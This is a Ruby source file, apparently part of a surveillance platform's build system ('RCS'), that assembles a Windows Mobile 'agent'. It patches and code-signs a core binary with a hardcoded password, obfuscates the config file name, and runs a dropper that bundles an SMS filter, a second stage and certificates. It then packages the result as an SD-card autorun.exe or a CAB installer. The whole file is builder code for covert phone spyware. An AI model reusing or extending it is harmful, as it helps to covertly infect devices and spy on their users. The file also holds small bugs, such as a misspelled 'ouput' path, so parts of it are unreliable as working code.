#
#  Agent creation for winMo
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildWinMo < Build

  def initialize
    super
    @platform = 'winmo'
  end

  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # invoke the generic patch method with the new params
    super

    # sign the core after the binary patch
    CrossPlatform.exec path('signtool'), "sign /P password /f pfx core"

  end

  def scramble
    trace :debug, "Build: scrambling"

    @scrambled = {config: 'cptm511.dql'}

    # call the super which will actually do the renaming
    # starting from @outputs and @scrambled
    super

  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    CrossPlatform.exec path('dropper'), path('core')+' '+
                                        path('smsfilter')+' '+
                                        path('secondstage')+' '+
                                        path(@scrambled[:config])+' '+
                                        path('cer')+' '+
                                        path('pfx')+' '+
                                        path('output')

    File.exist? path('output') || raise("output file not created by dropper")

    trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"

    @outputs << 'output'
  end


  def pack(params)
    trace :debug, "Build: pack: #{params}"

    case params['type']
      when 'card'
        Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
          z.file.open('2577/autorun.exe', "w") { |f| f.write File.open(path('firststage'), 'rb') {|f| f.read} }
          z.file.open('2577/autorun.zoo', "w") { |f| f.write File.open(path('output'), 'rb') {|f| f.read} }
        end
        # this is the only file we need to output after this point
        @outputs = ['output.zip']

      when 'cab'
        File.rename(path('firststage'), path('autorun.exe'))
        File.rename(path('ouput'), path('autorun.zoo'))

        # if the file 'user' is present, we need to include it in the cab
        # the file was saved during the melt phase
        if File.exist? path('user')
          FileUtils.cp_r(path('custom/*'), path('.'))
        else
          FileUtils.cp_r(path('new/*'), path('.'))
        end

        CrossPlatform.exec path('cabwiz'), path('rcs.inf') + ' /dest ' + path() + ' /compress'

        File.exist? path('rcs.cab') || raise("output file not created by cabwiz")

        # this is the only file we need to output after this point
        @outputs = ['rcs.cab']
    end

  end
end

end #DB::
end #RCS::
